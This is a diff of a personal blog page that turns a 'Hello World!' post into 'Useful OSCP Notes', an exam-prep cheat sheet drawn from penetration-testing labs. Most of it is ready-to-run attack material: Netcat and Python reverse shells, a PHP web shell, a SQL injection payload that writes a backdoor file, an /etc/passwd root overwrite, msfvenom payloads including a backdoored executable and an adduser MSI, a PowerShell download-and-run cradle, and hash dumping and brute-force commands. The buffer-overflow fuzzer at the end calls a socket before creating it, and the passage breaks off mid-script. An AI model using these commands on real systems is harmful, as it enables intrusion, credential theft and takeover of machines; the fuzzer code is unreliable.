@@ -11,7 +11,7 @@
 
   <title>
     
-      Hello World! &middot; Nihaal Prasad
+      Useful OSCP Notes &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Hello World!</h1>
+  <h1 class="page-heading">Useful OSCP Notes</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,33 +193,515 @@
 
   <hr>
   <div class="post-body">
-    <p>Hello world! This is my first blog post.</p>
+    <p>I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.</p>
 
-<section class="related">
-  <h3 style="color: black">Related Posts</h3>
-  <ul class="post-list">
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2020/02/06/useful-oscp-notes.html">
-          Useful OSCP Notes
-        </a>
-      </li>
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2019/11/27/creating-code-grapher-tool.html">
-          Creating a Code Grapher Tool
-        </a>
-      </li>
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2019/06/15/pi-hole-ad-blocker.html">
-          Network-wide Ad Blocking Using Pi-hole
-        </a>
-      </li>
-    
-  </ul>
-</section>
+<h3 id="nmap">Nmap</h3>
+<p>Ping Scan:
+<code class="highlighter-rouge">nmap -sn [IP addresses]</code></p>
 
+<p>Search for specific port:
+<code class="highlighter-rouge">nmap -p [port] [IP addresses]</code></p>
+
+<p>OS Fingerprinting:
+<code class="highlighter-rouge">nmap -O [IP address]</code></p>
+
+<p>Banner Grabbing:
+<code class="highlighter-rouge">nmap -sV -sT [IP addresses]</code></p>
+
+<p>Connect to SMB and determine OS:
+<code class="highlighter-rouge">nmap [IP address] --script smb-os-discovery.nse</code></p>
+
+<p>DNS Zone Transfer:
+<code class="highlighter-rouge">nmap --script=dns-zone-transfer -p 53 [target]</code></p>
+
+<p>FTP Bounce Scan:
+<code class="highlighter-rouge">nmap -p- -b anonymous@[FTP Server] [target] -Pn</code></p>
+
+<p>List of NSE scripts that could be used for vulnerability scanning:
+<code class="highlighter-rouge">ls -l /usr/share/nmap/scripts/*vuln*</code></p>
+
+<p><a href="www.stationx.net/nmap-cheat-sheet/">Link to a more in-depth Nmap quide</a></p>
+
+<h3 id="dns">DNS</h3>
+<p>Finding name servers:
+<code class="highlighter-rouge">host -t ns example.com</code></p>
+
+<p>Finding mail servers:
+<code class="highlighter-rouge">host -t mx example.com</code></p>
+
+<p>Looking up an IP address:
+<code class="highlighter-rouge">host example.com</code></p>
+
+<p>Brute force IP addresses given a list of possible names:
+<code class="highlighter-rouge">for ip in $(cat list.txt); do host $ip.example.com;done | grep -v "not found"</code></p>
+
+<p>Brute force domain names given list of possible IP addresses:
+<code class="highlighter-rouge">for ip in $(seq 155 190);do host xxx.xxx.xxx.$ip;done | grep -v "not found"</code></p>
+
+<p>Zone Transfer:
+<code class="highlighter-rouge">host -l example.com [name server]</code></p>
+
+<p>Script that automatically checks each DNS server and does a zone transfer:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Simple Zone Transfer Bash Script 
+#!/bin/bash 
+# $1 is the first argument given after the bash script 
+# Check if argument was given, if not, print usage 
+if [ -z "$1" ]; then 
+echo "[*] Simple Zone transfer script" 
+echo "[*] Usage 
+: $0 &lt;domain name&gt; " 
+exit 0 
+fi 
+# if argument was given, identify the DNS servers for the domain 
+for server in $(host -t ns $1 |cut -d" " -f4);do 
+# For each of these servers, attempt a zone transfer 
+host -l $1 $server |grep "has address" 
+done 
+</code></pre></div></div>
+
+<h3 id="smb">SMB</h3>
+<p>General enumeration:
+<code class="highlighter-rouge">enum4linux -a [IP]</code></p>
+
+<p>Scan for open shares:
+<code class="highlighter-rouge">nbtscan -r [IP]</code></p>
+
+<p>OS discovery:
+<code class="highlighter-rouge">nmap -v -p 139, 445 --script=smb-os-discovery [IP]</code></p>
+
+<p>SMB vuln scan:
+<code class="highlighter-rouge">nmap -v -p 139,445 --script=smb-vuln* --script-args=unsafe=1 </code></p>
+
+<p>Finding version of SMB: Use <a href="https://raw.githubusercontent.com/rewardone/OSCPRepo/master/scripts/recon_enum/smbver.sh">this script</a>.</p>
+
+<p>SMBMap:
+<code class="highlighter-rouge">smbmap -H [IP]</code></p>
+
+<p>View share names:
+<code class="highlighter-rouge">smbclient -L [IP] -N</code></p>
+
+<p>Connecting to an SMB share:
+<code class="highlighter-rouge">smbclient \\\\[IP]\\[share name]</code></p>
+
+<p>Mount shares:
+<code class="highlighter-rouge">mount -t cifs //[IP]/[share name] [folder to mount to] -o username=[username],vers=1.0</code></p>
+
+<p>Common exploits: <a href="https://www.exploit-db.com/exploits/40279">MS08-067</a> and <a href="https://github.com/worawit/MS17-010">MS17-010</a></p>
+
+<h3 id="http">HTTP</h3>
+
+<p>Brute force directories:
+<code class="highlighter-rouge">gobuster -u [URL] -w /usr/share/wordlists/dirb/common.txt</code></p>
+
+<p>Scanning for possible vulns:
+<code class="highlighter-rouge">nikto --host [IP address]</code></p>
+
+<p>Scanning for vulns in Wordpress:
+<code class="highlighter-rouge">wpscan --url [URL]</code></p>
+
+<h3 id="reverse-shells">Reverse Shells</h3>
+<p>Netcat reverse shell (target): <code class="highlighter-rouge">nc -nv [your IP] [port] -e cmd.exe</code>. Replace cmd.exe with /bin/sh if the target is on linux.</p>
+
+<p>Netcat reverse shell listener (local): <code class="highlighter-rouge">nc -nlvp 4444</code></p>
+
+<p>Python reverse shell: Make a local reverse shell listener, then run <code class="highlighter-rouge">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code> on the target (change the IP and port in the code).</p>
+
+<p>Amazing PHP reverse shell that I use all the time: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey</a></p>
+
+<p>A list of other handy reverse shells: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a></p>
+
+<h3 id="sql-injection">SQL Injection</h3>
+<p>Useful guides: <a href="http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html">Security Idiots</a> and <a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection">pentestmonkey</a></p>
+
+<p>Find the number of columns: Use the <code class="highlighter-rouge">order by [count]</code> instruction in your SQL injection. Start with 1, and then gradually increment count until you get an error.</p>
+
+<p>Adding your own select statement: Type in a normal query value and then type in <code class="highlighter-rouge">union all select 1,2,3,4,5,6</code>. Note that both statements must have the same number of columns.</p>
+
+<p>Discover MySQL version: <code class="highlighter-rouge">union all select 1,2,3,4,@@version,6</code>. Obviously, you’ll have to modify this to use the correct number of columns.</p>
+
+<p>Discover the current user: <code class="highlighter-rouge">union all select 1,2,3,4,user(),6</code></p>
+
+<p>Getting a list of tables: <code class="highlighter-rouge">union all select 1,2,3,4,table_name,6 FROM information_schema.tables</code></p>
+
+<p>Getting the names of columns of a table: <code class="highlighter-rouge">union all select 1,2,3,4,column_name,6 from information_schema.columns where table_name='users'</code></p>
+
+<p>Concatenate strings from two columns in to a single column: <code class="highlighter-rouge">union all select 1,2,3,4,concat(column1,0x3a,column2) from table_name</code>. Replace column1, column2, and table_name with the correct values.</p>
+
+<p>Limit the number of rows returned: <code class="highlighter-rouge">LIMIT [rows]</code></p>
+
+<p>Reading local files in MySQL: <code class="highlighter-rouge">union all select 1,2,3,4,load_file('file/path'),6</code></p>
+
+<p>Writing local files: <code class="highlighter-rouge">'union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd']);?&gt;",6 into OUTFILE 'backdoor.php'</code></p>
+
+<p>MS-SQL instant root: Sometimes you can instantly root the machine if you have DB credentials for MSSQL. <code class="highlighter-rouge">nmap -p 443 -Pn -sS --script ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=password,mssql.instance-all,ms-sql-xp-cmdshell.cmd="whoami" [IP]</code></p>
+
+<h3 id="lfirfi">LFI/RFI</h3>
+<p>Suppose you have the ability to include any local php file on the target, and also suppose that you could write any php script to the target. You could write the following PHP code: <code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span></code> to obtain code execution via the cmd parameter.</p>
+
+<p>For RFIs, you can just set the PHP include parameter to be a file on your local web server that gives you code execution.</p>
+
+<p>For more information on LFI/RFI vulns, <a href="https://hackersonlineclub.com/lfi-rfi/">click here</a>.</p>
+
+<h3 id="password-attacks">Password Attacks</h3>
+<p>List of default credentials: <a href="http://open-sez.me/">Open-sez.me</a> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv">Default-passwords</a></p>
+
+<p>Wordlists: Kali has wordlists located under /usr/share/wordlists/. There is also a common usernames file under /usr/share/commix/src/txt/usernames.txt</p>
+
+<p>Generate all possible combinations of a list of characters: <code class="highlighter-rouge">crunch [min] [max] [list of characters] -o [output file]</code></p>
+
+<p>Generate password lists using words from a website: <code class="highlighter-rouge">cewl [URL]</code></p>
+
+<p>Brute force websites using Medusa: <code class="highlighter-rouge">medusa -h [IP] -U [usernames file] -P [passwords file]</code></p>
+
+<p>Wordpress brute force: <code class="highlighter-rouge">wpscan --log --batch --url [IP address] --wordlist /usr/share/wordlists/rockyou.txt --username [username] --threads 20</code></p>
+
+<p>Brute force web logins: <code class="highlighter-rouge">hydra -l [user] -p [password] [IP] http-post-form "&lt;Login Page&gt;:&lt;Request Body&gt;:&lt;Error message&gt;"</code></p>
+
+<p>Brute force RDP: <code class="highlighter-rouge">ncrack -vv --user [user] -P [passwords file] rdp://[IP]</code></p>
+
+<p>Brute force SNMP: <code class="highlighter-rouge">hydra -P [passwords file] -v [IP] snmp</code></p>
+
+<p>Brute force SSH: <code class="highlighter-rouge">hydra -l root -P [passwords file] [IP] ssh</code></p>
+
+<p>Dumping windows password hashes: Send over /usr/share/windows-binaries/fgdump.exe over to the target, and then run fgdump.exe. It will output files in a pwdump file.</p>
+
+<p>Windows credential editor: WCE can search for passwords and steal credentials from memory. It is located under the /usr/share/wce/ directory in Kali.</p>
+
+<p>Brute force pwdump (fgdump output): <code class="highlighter-rouge">john --wordlist=/usr/share/wordlists/rockyou.txt [pwdump file]</code></p>
+
+<p>Cracking linux hashes (you will need both /etc/passwd and /etc/shadow):</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+</code></pre></div></div>
+
+<p>Brute force password-protected zip files:
+<code class="highlighter-rouge">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt [zip file]</code></p>
+
+<p>Pass-the-hash for SMB:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export SMBHASH=[Hash]
+pth-winexe -U administrator% //[IP] cmd
+</code></pre></div></div>
+
+<p>If you want to login to SMB, you could also do <code class="highlighter-rouge">smbmap -u [username] -p [hash] -H [IP]</code>.</p>
+
+<h3 id="file-uploaddownload">File Upload/Download</h3>
+<p><b>Netcat:</b></p>
+
+<p>On the receiving end: <code class="highlighter-rouge">nc -l -p 1234 &gt; file</code></p>
+
+<p>On the sending end: <code class="highlighter-rouge">nc [destination] 1234 &lt; file</code></p>
+
+<p><b>pyftpdlib:</b></p>
+
+<p>On Kali Linux:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp folder/to/share
+pip install pyftpdlib
+python -m pyftpdlib -w -p 21
+</code></pre></div></div>
+
+<p>On the target: <code class="highlighter-rouge">ftp [your IP]</code></p>
+
+<p>On the target, you could also write down the ftp commands you’ll use in a file and then run <code class="highlighter-rouge">ftp -s:ftp_commands.txt</code>. The first line should be <code class="highlighter-rouge">open [IP address]</code>, and the next two lines should be the username and password (if the username is anonymous, you can set the password to be anything, but it must be something).</p>
+
+<p><b>smbserver.py</b></p>
+
+<p>On Kali:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
+smbserver.py a file
+</code></pre></div></div>
+
+<p>On the target: <code class="highlighter-rouge">\\[your IP]\a\file</code></p>
+
+<p><b>TFTP</b></p>
+
+<p>On Kali:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir tftp/
+atftpd --daemon --port 69 tftp/
+cp [file to send] tftp/
+</code></pre></div></div>
+
+<p>On the target: <code class="highlighter-rouge">tftp -i [your IP] get [file]</code></p>
+
+<p><b>HTTP</b></p>
+
+<p>Setup a web server on Kali using <code class="highlighter-rouge">systemctl enable apache2</code>. Copy the file that you want to send to /var/www/html/. Then navigate to http://[your IP]/file on the target system’s web browser. If you are unable to access the target system’s web browser, create a script called wget.vbs on the target machine by running the following code:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs 
+echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs 
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs 
+echo Err.Clear &gt;&gt; wget.vbs 
+echo Set http = Nothing &gt;&gt; wget.vbs 
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs 
+echo http.Open "GET", strURL, False &gt;&gt; wget.vbs 
+echo http.Send &gt;&gt; wget.vbs 
+echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs 
+echo Set http = Nothing &gt;&gt; wget.vbs 
+echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs 
+echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs 
+echo strData = "" &gt;&gt; wget.vbs 
+echo strBuffer = "" &gt;&gt; wget.vbs 
+echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs 
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs 
+echo Next &gt;&gt; wget.vbs 
+echo ts.Close &gt;&gt; wget.vbs 
+</code></pre></div></div>
+
+<p>Then execute <code class="highlighter-rouge">cscript wget.vbs http://[your IP]/file</code> on the target machine.</p>
+
+<p><b>Powershell</b></p>
+
+<p>For targets that have powershell installed, you can create a powershell script to download a file from a webserver. Setup a webserver on Kali Linux using <code class="highlighter-rouge">systemctl enable apache2</code>, and move the file you want to send to /var/www/html. Run this on the target:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo $storageDir = $pwd &gt; wget.ps1 
+echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1 
+echo $url = "http://10.11.0.5/file" &gt;&gt;wget.ps1 
+echo $file = "new-exploit.exe" &gt;&gt;wget.ps1 
+echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1 
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1 
+</code></pre></div></div>
+
+<h3 id="msfvenom">Msfvenom</h3>
+<p>Common payloads:</p>
+<ul>
+  <li>windows/shell_reverse_tcp</li>
+  <li>windows/shell/reverse_tcp (staged)</li>
+  <li>php/reverse_php</li>
+  <li>windows/meterpreter/reverse_https (popular for looking just like normal web traffic)</li>
+  <li>linux/x86/shell_reverse_tcp</li>
+  <li>linux/x86/shell/reverse_tcp (staged)</li>
+</ul>
+
+<p>Creating a windows reverse shell: <code class="highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c</code></p>
+
+<p>Avoiding bad characters: <code class="highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d" </code></p>
+
+<p>Prevent the process from exiting: Use the <code class="highlighter-rouge">EXITFUNC=thread</code> option when using msfvenom.</p>
+
+<p>Injecting a payload into an existing PE executable: <code class="highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=[local IP] LPORT=[listening port] -f exe -e x86/shikata_ga_nai -i 9 -x binary_to_inject_into.exe -o shell_reverse_msf_encoded_embedded.exe</code></p>
+
+<h3 id="upgrading-shell">Upgrading Shell</h3>
+
+<p>On a Kali Linux terminal, use <code class="highlighter-rouge">stty -a</code> to see information about your window. On the victim, run <code class="highlighter-rouge">python -c 'import pty; pty.spawn("/bin/bash")'</code> (if the victim does not have Python installed, <a href="https://netsec.ws/?p=337">click here</a> to get a list of other commands that you can run). After running the command to spawn a TTY shell, Ctrl-Z out of the reverse shell you’re currently in, and type in the following three commands:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty raw -echo
+fg
+reset
+</code></pre></div></div>
+<p>Note that your terminal may get messed up while doing this and print out random characters, but once you type in “reset”, it should go back to normal. Now all you have to do is type in the following three commands:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export SHELL=bash
+export TERM=[terminal type]
+stty rows [rows] columns [134]
+</code></pre></div></div>
+<p>You should know how many rows and columns you have because when you typed in <code class="highlighter-rouge">stty -a</code> earlier, it printed out this information. The terminal type can vary depending on what kind of terminal you have, but I used “xterm-256color” as my terminal type.</p>
+
+<h3 id="linux-privesc">Linux Privesc</h3>
+
+<p>Find the version of linux: <code class="highlighter-rouge">uname -a</code></p>
+
+<p>Add public key to list of authorized SSH keys: <code class="highlighter-rouge">echo $(wget http://[your IP]/.ssh/id_rsa.pub) &gt;&gt; ~/.ssh/authorized_keys </code></p>
+
+<p>C Code for becoming root (required for some exploits): <code class="highlighter-rouge">echo -e '#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' &gt; setuid.c</code></p>
+
+<p>If /etc/password has incorrect permissions, execute this code to instantly become root: <code class="highlighter-rouge">echo 'root::0:0:root:/root:/bin/bash' &gt; /etc/passwd; su</code></p>
+
+<p>Changing PATH: If you can change the PATH variable, run <code class="highlighter-rouge">export PATH=.$PATH</code> to add the current folder to the PATH variable. Create a poisoned executable by typing in <code class="highlighter-rouge">echo "usermod -aG sudo [username]" &gt;&gt; /tmp/yo</code> and <code class="highlighter-rouge">chmod +x yo</code>. Replace yo with the name of a binary that is executed by root by another command or process. If you’re still confused, have a look at <a href="http://techblog.rosedu.org/exploiting-environment-variables.html">this</a>.</p>
+
+<p>Add to sudoers: Run <code class="highlighter-rouge">usermod -aG sudo [username]</code>. You could also try seeing if you have permission to edit the /etc/sudoers file using <code class="highlighter-rouge">visudo</code>. Sometimes, if you’re lucky, you can instantly get root by doing <code class="highlighter-rouge">sudo su</code>.</p>
+
+<p>Print commands that we are allowed to run as sudo: <code class="highlighter-rouge">sudo -l</code></p>
+
+<p>If you see a command in this list that allows you execute code, then you can execute code as root. For example, if we are allowed to use the find command as sudo, you can use <code class="highlighter-rouge">sudo find /home -exec sh -i\;</code>. Another example: if we are allowed to use the python command as sudo, you can use <code class="highlighter-rouge">sudo python -c "import pty; pty.spawn('/bin/bash');"</code>. You can use <a href="https://gtfobins.github.io/">GTFOBins</a> to get a list of things that you can do when you are able to execute something as root.</p>
+
+<p>Exploit cron jobs: You can find cron jobs using <code class="highlighter-rouge">ls -la /etc/cron.d</code>. If you can write to any of the files controlling the cron job, you can write your own command at the end of a cron job and have it be executed as root. For example, if you see a cron job called “update”, you can search for the sh file that is running that cron job using <code class="highlighter-rouge">find / -perm 2 -type f 2&gt;/dev/null | grep update</code>, and then you can modify it.</p>
+
+<p>Print out binaries that have the SUID bit set: <code class="highlighter-rouge">find / -perm -u=s type f 2&gt;/dev/null</code>. Sometimes <a href="https://gtfobins.github.io/">GTFOBins</a> can help you escalate privileges if you see an SUID binary.</p>
+
+<p>Script to extract passwords from known locations: <a href="https://github.com/0xmitsurugi/gimmecredz">gimmecredz</a></p>
+
+<p>Enumeration scripts:</p>
+<ul>
+  <li><a href="https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py">linuxprivchecker.py</a></li>
+  <li><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a></li>
+  <li><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></li>
+</ul>
+
+<p>Good checklists:</p>
+<ul>
+  <li><a href="https://guif.re/linuxeop">Guif.re</a></li>
+  <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a></li>
+  <li><a href="https://payatu.com/guide-linux-privilege-escalation">payatu</a></li>
+</ul>
+
+<h3 id="windows-privesc">Windows Privesc</h3>
+
+<p>Get system info: <code class="highlighter-rouge">systeminfo</code></p>
+
+<p>List environment variables: <code class="highlighter-rouge">set</code></p>
+
+<p>List your privileges: <code class="highlighter-rouge">whoami /priv</code></p>
+
+<p>Overwriting an Executable with Insecure Permissions:
+Create a program called useradd.c on either the target (preferable, but if they don’t have gcc, you can’t do this) or on Kali.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt; 
+
+int main () { 
+    int i; 
+    i=system ("net localgroup administrators low /add"); 
+    return 0; 
+} 
+</code></pre></div></div>
+<p>Replace low with the name of your current user. Compile useradd.c using <code class="highlighter-rouge">i686-w64-mingw32-gcc -o tooverwrite.exe useradd.c</code>, and move the exexcutable to the same directory as the executable that you want to overwrite.</p>
+
+<p>List scheduled tasks: <code class="highlighter-rouge">schtasks /query /fo LIST /v</code></p>
+
+<p>List running services: <code class="highlighter-rouge">tasklist /SVC</code></p>
+
+<p>List started services: <code class="highlighter-rouge">net start</code></p>
+
+<p>See what software is installed:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /a "C:\Program Files" 
+dir /a "C:\Program Files (x86)" 
+reg query HKEY_LOCAL_MACHINE\SOFTWARE 
+</code></pre></div></div>
+
+<p>Dumping windows password hashes: You can use fgdump.exe to dump passwords in a file ending with .pwdump. Fgdump will also attempt to kill local antiviruses before dumping the passwords.</p>
+
+<p>Adding users: <code class="highlighter-rouge">net user [username] [password] /ADD</code></p>
+
+<p>Changing group: <code class="highlighter-rouge">net localgroup [group name] [username] /ADD</code></p>
+
+<p>AlwaysElevated: Check if these two registry values are set to 1 by using <code class="highlighter-rouge">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code> and <code class="highlighter-rouge">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code>. If they are, then use the following command to create a malicious MSI: <code class="highlighter-rouge">msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi</code>. Send the MSI to the target, and run the MSI file using <code class="highlighter-rouge">msiexec /quiet /qn /i evil.msi</code>.</p>
+
+<p>Looking at the registry: If you can’t use the reg command, use the regedit command instead.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regedit /E file.reg "REGISTRY/VALUE/TO/READ"
+type file.reg
+</code></pre></div></div>
+
+<p>Getting admin hashes: Look in the below locations for password hashes</p>
+<ul>
+  <li>%SYSTEMROOT%\repair\SAM</li>
+  <li>%SYSTEMROOT%\System32\config\RegBack\SAM</li>
+  <li>%SYSTEMROOT%\System32\config\SAM</li>
+  <li>%SYSTEMROOT%\repair\system</li>
+  <li>%SYSTEMROOT%\System32\config\SYSTEM</li>
+  <li>%SYSTEMROOT%\System32\config\RegBack\system</li>
+</ul>
+
+<p>Download both the SAM file and the SYSTEM file onto Kali Linux, and then run <code class="highlighter-rouge">impacket-secretdump -sam SAM -system SYSTEM local</code> to get the hashes.</p>
+
+<p>Searching for exploits: Run <a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py">this script</a> on Kali.</p>
+
+<p>Checklists:</p>
+<ul>
+  <li><a href="http://www.fuzzysecurity.com/tutorials/16.html">fuzzysecurity</a></li>
+  <li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">absolomb</a></li>
+</ul>
+
+<p>Jaws Windows Enumerate Script (Requires Powershell): The script is found <a href="https://github.com/411Hall/Jaws">here</a>. You can easily download and run the script using the following commands (assuming that you have a webserver setup on Kali and you have put the jaws-enum.ps1 file under /var/www/html).</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell 
+IEX(New-Object Net.WebClient).downloadString('http://[your IP]/jaws-enum.ps1') 
+</code></pre></div></div>
+
+<h3 id="metasploit">Metasploit</h3>
+
+<p>Selecting a module:
+<code class="highlighter-rouge">use [module]</code></p>
+
+<p>Setting a payload:
+<code class="highlighter-rouge">use [payload]</code></p>
+
+<p>Common payloads:</p>
+<ul>
+  <li>windows/shell_reverse_tcp</li>
+  <li>windows/shell/reverse_tcp (staged)</li>
+  <li>php/reverse_php</li>
+  <li>windows/meterpreter/reverse_https (popular for looking just like normal web traffic)</li>
+  <li>linux/x86/shell_reverse_tcp</li>
+  <li>linux/x86/shell/reverse_tcp (staged)</li>
+</ul>
+
+<p>Handle incoming connections:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set LHOST [local IP]
+set LPORT [port]
+exploit
+</code></pre></div></div>
+
+<p>Common meterpreter commands:</p>
+<ul>
+  <li>Upload files: <code class="highlighter-rouge">upload [local file] [remote location for file]</code></li>
+  <li>Download files: <code class="highlighter-rouge">download [remote file] [local location for file]</code></li>
+  <li>Open a shell: <code class="highlighter-rouge">shell</code></li>
+  <li>Find basic information about the target: <code class="highlighter-rouge">sysinfo</code></li>
+  <li>Get the current user: <code class="highlighter-rouge">getuid</code></li>
+  <li>Search for a file: <code class="highlighter-rouge">search –f *pass*.txt</code></li>
+  <li>Take a screenshot of the desktop: <code class="highlighter-rouge">screenshot</code></li>
+</ul>
+
+<p>Convert metasploit modules to stand alone (a little bit advanced): <a href="https://netsec.ws/?p=262">https://netsec.ws/?p=262</a></p>
+
+<h3 id="steps-for-buffer-overflow">Steps for Buffer Overflow</h3>
+<p>1.) Gradually fuzz the input until you see that the program has crashed. Here is an example program that can be used for fuzzing:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python 
+</span><span class="kn">import</span> <span class="nn">socket</span> 
+<span class="c1"># Create an array of buffers, from 1 to 5900, with increments of 200. 
+</span><span class="nb">buffer</span><span class="o">=</span><span class="p">[</span><span class="s">"A"</span><span class="p">]</span> 
+<span class="n">counter</span><span class="o">=</span><span class="mi">100</span> 
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">30</span><span class="p">:</span> 
+    <span class="nb">buffer</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="n">counter</span><span class="p">)</span> 
+    <span class="n">counter</span><span class="o">=</span><span class="n">counter</span><span class="o">+</span><span class="mi">200</span> 
+<span class="k">for</span> <span class="n">string</span> <span class="ow">in</span> <span class="nb">buffer</span><span class="p">:</span> 
+    <span class="k">print</span> <span class="s">"Fuzzing PASS with </span><span class="si">%</span><span class="s">s bytes"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> 
+    <span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'IP address'</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>  <span class="c1"># Change IP and port!
+</span>    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> 
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'USER test</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> 
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> 
